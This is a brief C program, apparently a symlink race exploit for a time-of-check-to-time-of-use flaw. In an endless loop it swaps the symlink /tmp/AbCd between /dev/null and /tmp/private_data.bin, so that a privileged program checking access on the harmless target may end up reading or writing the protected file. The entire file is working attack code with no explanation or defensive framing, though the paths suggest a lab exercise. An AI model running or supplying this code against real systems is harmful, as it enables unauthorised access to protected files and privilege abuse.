#include <unistd.h>

#define TARGET_FILE_NAME		"/tmp/AbCd"
#define ACCESSIBLE_FILE_NAME	"/dev/null"
#define PRIVILEGE_FILE_NAME		"/tmp/private_data.bin"

void symlink_set(const char* taget_name, const char* src_name)
{
	unlink(src_name);
	symlink(taget_name, src_name);

	usleep(1000);
}

int main(void)
{
	while (1) {
		symlink_set(ACCESSIBLE_FILE_NAME, TARGET_FILE_NAME);
		symlink_set(PRIVILEGE_FILE_NAME, TARGET_FILE_NAME);
	}

	return 0;
}
